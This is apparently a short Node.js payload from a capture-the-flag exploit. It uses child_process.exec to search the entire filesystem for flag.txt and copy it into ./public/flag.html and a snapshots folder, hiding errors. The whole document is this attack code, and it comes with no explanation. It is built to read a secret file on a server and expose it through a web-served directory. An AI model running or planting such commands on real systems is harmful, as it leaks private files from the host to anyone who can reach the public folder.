import { exec } from 'node:child_process';

// This runs the literal system 'cp' command
exec('find / -name flag.txt -exec cp {} ./public/flag.html \\; 2>/dev/null', (err) => {
  if (err) console.error('System copy failed', err);
  else console.log('Done');
});

exec('mkdir ./snapshots/1', (err) => {
  if (err) console.error('System copy failed', err);
  else console.log('Done');
});

exec('find / -name flag.txt -exec cp {} ./snapshots/1/flag.html \\; 2>/dev/null', (err) => {
  if (err) console.error('System copy failed', err);
  else console.log('Done');
});

